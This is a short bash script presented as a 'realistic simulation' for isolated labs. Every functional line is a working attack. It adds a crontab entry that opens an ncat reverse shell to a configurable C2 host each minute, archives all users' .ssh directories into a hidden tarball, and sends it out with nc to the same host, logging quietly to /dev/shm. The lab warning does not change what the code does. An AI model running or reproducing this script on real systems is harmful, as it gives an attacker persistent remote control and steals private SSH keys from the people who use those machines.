#!/bin/bash
# WARNING: REALISTIC SIMULATION - USE ONLY IN ISOLATED LABS
C2="192.168.1.100"  # Replace with your test IP
LOG="/dev/shm/.log"

{
  echo "[+] Starting advanced simulation..."
  # Persistence
  echo "* * * * * ncat $C2 4444 -e /bin/bash" | crontab -
  # Data collection
  tar -czf /tmp/.stolen_data.tgz /home/*/.ssh 2>/dev/null
  # Exfiltration simulation
  nc -w 3 $C2 4444 < /tmp/.stolen_data.tgz
} > "$LOG" 2>&1
